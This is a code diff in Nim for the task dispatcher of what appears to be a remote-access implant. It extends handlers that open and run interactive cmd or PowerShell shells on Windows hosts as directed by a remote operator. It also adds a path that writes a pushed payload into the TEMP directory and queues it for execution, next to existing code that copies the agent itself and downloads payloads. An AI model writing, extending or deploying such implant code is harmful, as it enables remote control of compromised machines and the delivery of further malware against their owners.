@@ -2815,15 +2815,26 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
 
   of "ISHELL_OPEN":
     when defined(windows):
+      var shellArg = args.strip()
       try:
-        let shell = parseJson(args){"shell"}.getStr("cmd")
-        t.sendResult(id, doIshellOpen(shell), "")
-      except: t.sendResult(id, "", "ishell_open: " & getCurrentExceptionMsg())
+        let openArgs = parseJson(args)
+        if openArgs.kind == JObject and openArgs.hasKey("shell"):
+          shellArg = openArgs["shell"].getStr()
+      except: discard # legacy clients send the shell name as plain text
+      if shellArg == "": shellArg = "cmd"
+      t.sendResult(id, doIshellOpen(shellArg), "")
     else:
       t.sendResult(id, "", "ISHELL_OPEN: not supported on Linux")
 
   of "ISHELL_RUN":
-    when defined(windows): t.sendResult(id, doIshellRun(args), "")
+    when defined(windows):
+      var cmdLine = args
+      try:
+        let runArgs = parseJson(args)
+        if runArgs.kind == JObject and runArgs.hasKey("cmd"):
+          cmdLine = runArgs["cmd"].getStr()
+      except: discard # legacy clients may send a raw PowerShell block
+      t.sendResult(id, doIshellRun(cmdLine), "")
     else: t.sendResult(id, "", "ISHELL_RUN: not supported on Linux")
 
   of "ISHELL_CLOSE":
@@ -2925,6 +2936,13 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
           if payloadName == "self":
             payData = cast[seq[byte]](readFile(getAppFilename()))
             if cmd == "": cmd = getAppFilename()
+          elif payload.len > 0:
+            payData = payload
+            if cmd == "":
+              let tmpPath = getEnv("TEMP", getTempDir()) & "\\" & payloadName
+              try: writeFile(tmpPath, cast[string](payData))
+              except: discard
+              cmd = tmpPath
           else:
             payData = t.downloadFile(payloadName)
             if payData.len == 0:
